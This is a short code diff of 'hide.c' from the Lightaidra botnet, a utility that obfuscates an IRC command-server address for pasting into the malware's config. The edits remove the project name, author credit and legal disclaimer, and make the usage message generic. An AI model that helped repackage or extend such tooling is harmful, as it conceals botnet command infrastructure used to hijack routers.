@@ -1,14 +1,4 @@
 /*
- * hide.c - USE LIGHTAIDRA AT YOUR OWN RISK!
- *
- * Lightaidra - IRC-based mass router scanner/exploiter.
- * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
- *
- * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
- * all applicable local, state and federal laws. Developers assume 
- * no liability and are not responsible for any misuse or damage 
- * caused by this program.
- *
  * example: ./hide -encode "127.0.0.1:6667"
  *          ./hide -decode ">@.C<C<C>U,,,." <- copy into config.h
  * CHANGE THE POSITION OF ENCODES[] VALUES IF YOU WANT YOUR PRIVATE ENCODING. 
@@ -74,7 +64,7 @@ void decode(char *str) {
 
 int main(int argc, char *argv[]) {
     if (argv[1] == 0 || argv[2] == 0) {
-        printf("./lighthide [-encode|-decode] [string]\n");
+        printf("%s [-encode|-decode] [string]\n", argv[0]);
         return(1);
     } 
     else if (!strncmp(argv[1], "-encode", 7)) {
